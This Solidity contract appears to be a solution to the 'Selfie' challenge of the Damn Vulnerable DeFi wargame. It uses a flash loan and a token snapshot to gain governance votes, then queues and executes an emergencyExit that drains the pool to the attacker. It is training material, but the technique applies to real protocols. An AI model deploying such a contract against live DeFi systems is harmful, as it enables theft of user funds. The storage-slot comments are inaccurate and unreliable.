// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {Ownable2Step} from "@openzeppelin/contracts/access/Ownable2Step.sol";
import {IDamnValuableTokenSnapshot} from "./IDamnValuableTokenSnapshot.sol";
import {ISelfiePool} from "./ISelfiePool.sol";
import {ISimpleGovernance} from "./ISimpleGovernance.sol";

contract SelfiePoolAttacker is IERC3156FlashBorrower, Ownable2Step {
    // slot 0
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");
    // slot 1
    IDamnValuableTokenSnapshot private immutable i_dvtSnapshot;
    // slot 2
    ISelfiePool private immutable i_selfiePool;
    // slot 3
    ISimpleGovernance private immutable i_simpleGovernance;
    // slot 4
    uint256 private s_actionId;

    error CallerIsNotSelfiePool();

    constructor(
        address _dvtSnapshot,
        address _selfiePool,
        address _simpleGovernance
    ) Ownable2Step() {
        i_dvtSnapshot = IDamnValuableTokenSnapshot(_dvtSnapshot);
        i_selfiePool = ISelfiePool(_selfiePool);
        i_simpleGovernance = ISimpleGovernance(_simpleGovernance);
    }

    function exploitQueueAction() external onlyOwner {
        i_selfiePool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(i_dvtSnapshot),
            i_dvtSnapshot.balanceOf(address(i_selfiePool)),
            ""
        );
        s_actionId = i_simpleGovernance.queueAction(
            address(i_selfiePool),
            0,
            abi.encodeCall(i_selfiePool.emergencyExit, (owner()))
        );
    }

    function exploitExecuteAction() external onlyOwner {
        i_simpleGovernance.executeAction(s_actionId);
    }

    function onFlashLoan(
        address,
        address,
        uint256 _amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        if (msg.sender != address(i_selfiePool)) {
            revert CallerIsNotSelfiePool();
        }
        i_dvtSnapshot.snapshot();
        i_dvtSnapshot.approve(msg.sender, _amount);

        return CALLBACK_SUCCESS;
    }
}
